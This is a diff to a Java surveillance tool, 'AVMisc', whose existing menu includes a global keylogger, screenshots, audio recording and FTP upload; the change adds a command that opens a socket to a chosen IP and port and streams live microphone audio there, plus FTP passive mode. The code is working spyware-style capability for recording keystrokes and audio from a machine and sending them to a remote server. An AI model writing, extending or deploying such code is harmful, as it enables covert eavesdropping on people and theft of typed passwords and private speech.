@@ -10,12 +10,14 @@ import java.awt.datatransfer.Transferable;
 import java.awt.datatransfer.UnsupportedFlavorException;
 import java.awt.image.BufferedImage;
 import java.io.BufferedReader;
+import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.net.Socket;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
@@ -55,7 +57,8 @@ public class AVMisc implements NativeKeyListener {
 	private long RECORD_TIME = 0;
 	private AtomicBoolean recordingAudio = new AtomicBoolean();
 	private AtomicBoolean playingAudio = new AtomicBoolean();
-	private Scanner sc;
+	private AtomicBoolean stopStreaming = new AtomicBoolean();
+	private Scanner sc = new Scanner(System.in);
 	private Thread recordingAudioThread;
 	private Thread playingAudioThread;
 	private FTPClient ftp;
@@ -63,10 +66,14 @@ public class AVMisc implements NativeKeyListener {
 	private String playingAudioFileName;
 	private Audio audio;
 	private Recorder recorder;
+	private String streamingAudioIP;
+	private int streamingAudioPort;
+	private int recordingAudioTime;
 	private boolean KLIsRunning = false;
 	private boolean shiftIsDown = false;
 	private Path klFilePath = Paths.get("file.txt");
 	private Path klLogFilePath = Paths.get("log.txt");
+	
 
 	public static void main(String[] args) {
 		AVMisc av = new AVMisc();
@@ -74,9 +81,9 @@ public class AVMisc implements NativeKeyListener {
 	}
 	
 	public AVMisc() {
-		sc = new Scanner(System.in);
 		recordingAudio.set(false);
 		playingAudio.set(false);
+		stopStreaming.set(false);
 		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
 		logger.setLevel(Level.OFF);
 		logger.setUseParentHandlers(false);
@@ -93,7 +100,7 @@ public class AVMisc implements NativeKeyListener {
 					listAudioDevices();
 					break;
 				case "start_audio_record":
-					recordAudio();
+					recordAudio(false);
 					break;
 				case "stop_audio_record":
 					stopRecordingAudio();
@@ -103,6 +110,12 @@ public class AVMisc implements NativeKeyListener {
 					break;
 				case "stop_audio_playback":
 					stopPlayingAudio();
+					break;
+				case "start_streaming_audio":
+					recordAudio(true);
+					break;
+				case "stop_streaming_audio":
+					stopRecordingAudio();
 					break;
 				case "screenshot":
 					takeScreenshot();
@@ -156,41 +169,81 @@ public class AVMisc implements NativeKeyListener {
 	/***
 	 * Record Audio
 	 */
-	private void recordAudio() {
+	private void recordAudio(boolean streaming) {
 		if (!recordingAudio.get()) {
-			int time = 0;
-			try {
-				// Get the time to record the audio
-				System.out.print("Enter the record time in seconds: ");
-				time = Integer.parseInt(sc.nextLine());
-				if (time <= 0) {
-					throw new NumberFormatException("Time entered is invalid.");
-				} 
-			} 
-			catch (NumberFormatException e) {
-				System.out.println(e.getMessage());
-				return;
+			if(streaming) {
+				// Get the IP address and port
+				System.out.print("Enter the IP address of the server: ");
+				streamingAudioIP = sc.nextLine();
+				System.out.print("Enter the port number: ");
+				streamingAudioPort = Integer.parseInt(sc.nextLine());
 			}
-			RECORD_TIME = time * 1000;
-			recordingAudioFileName = String.format("Audio_%s.au", dtf.format(LocalDateTime.now()));
+			else {
+				try {
+					// Get the time to record the audio
+					System.out.print("Enter the record time in seconds: ");
+					recordingAudioTime = Integer.parseInt(sc.nextLine());
+					if (recordingAudioTime <= 0) {
+						throw new NumberFormatException("Time entered is invalid.");
+					}
+				} 
+				catch (NumberFormatException e) {
+					System.out.println(e.getMessage());
+					return;
+				}
+			}
+			
 			recordingAudioThread = new Thread() {
 				@Override
 				public void run() {
-					try(FileOutputStream fos = new FileOutputStream(recordingAudioFileName)) {
-						recorder = new Recorder();
-						recorder.start(fos);
-						recordingAudio.set(true);
-						System.out.println("Recording...");
-						Thread.sleep(RECORD_TIME);
-					} 
-					catch (AudioException | IOException e) {
-						System.out.println(e.getMessage());
+					// Streaming audio
+					if(streaming) {
+						try {
+							Socket socket = new Socket(streamingAudioIP, streamingAudioPort);
+							try(DataOutputStream dos = new DataOutputStream(socket.getOutputStream())) {
+								recorder = new Recorder();
+								recorder.start(dos);
+								
+								recordingAudio.set(true);
+								System.out.println("Streaming audio for 2 minutes...");
+								Thread.sleep(120000);
+								socket.close();
+							} 
+							catch (AudioException | IOException e) {
+								System.out.println(e.getMessage());
+							}
+							catch(InterruptedException e) {}
+							finally {
+								recorder.stop();
+								recordingAudio.set(false);
+								stopStreaming.set(false);
+							}
+						}
+						catch(NumberFormatException | SecurityException | IOException e) {
+							System.out.println(e.getMessage());
+						}
 					}
-					catch(InterruptedException e) { }
-					finally {
-						recorder.stop();
-						recordingAudio.set(false);
-						System.out.printf("Audio recording saved as: '%s'.\n", recordingAudioFileName);
+					// Recording audio to save to a file
+					else {
+						RECORD_TIME = recordingAudioTime * 1000;
+						recordingAudioFileName = String.format("Audio_%s.au", dtf.format(LocalDateTime.now()));
+						
+						try(FileOutputStream fos = new FileOutputStream(recordingAudioFileName)) {
+							recorder = new Recorder();
+							recorder.start(fos);
+							recordingAudio.set(true);
+							System.out.println("Recording...");
+							Thread.sleep(RECORD_TIME);
+						} 
+						catch (AudioException | IOException e) {
+							System.out.println(e.getMessage());
+						}
+						catch(InterruptedException e) { }
+						finally {
+							recorder.stop();
+							recordingAudio.set(false);
+							System.out.printf("Audio recording saved as: '%s'.\n", recordingAudioFileName);
+						}
 					}
 				}
 			};
@@ -253,6 +306,7 @@ public class AVMisc implements NativeKeyListener {
 			playingAudio.set(false);
 		}
 	}
+	
 	
 	/***
 	 * Take a Screenshot
@@ -478,6 +532,8 @@ public class AVMisc implements NativeKeyListener {
 				+ "\t'stop_audio_record': Stop recording audio\n\n"
 				+ "\t'start_audio_playback': Play an audio file on the system\n\n"
 				+ "\t'stop_audio_playback': Stop playing audio\n\n"
+				+ "\t'start_streaming_audio': Connects to a server and starts streaming audio\n\n"
+				+ "\t'stop_streaming_audio': Stop streaming audio\n\n"
 				+ "\t'screenshot': Take a screenshot\n\n"
 				+ "\t'start_kl': Start the keylogger\n\n"
 				+ "\t'stop_kl': Stop the keylogger\n\n"
@@ -502,6 +558,7 @@ public class AVMisc implements NativeKeyListener {
 			if(!FTPReply.isPositiveCompletion(replyCode)) {
 				return false;
 			}
+			ftp.enterLocalPassiveMode();
 			// Login if necessary
 			System.out.print("Do you need to login? (y/n): ");
 			String response = sc.nextLine();
@@ -521,12 +578,13 @@ public class AVMisc implements NativeKeyListener {
 		}
 	}
 
+
 	
 	/********** KEYBOARD EVENT HANDLERS **********/
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent event) {
 		try {
-			String keyText = "";
+			String keyText = ""; // The text written to the basic log file
 			String logKeyText = String.format("%s ----- %s\n", NativeKeyEvent.getKeyText(event.getKeyCode()), logDTF.format(LocalDateTime.now()));
 			switch(event.getKeyCode()) {
 				case NativeKeyEvent.VC_SPACE:
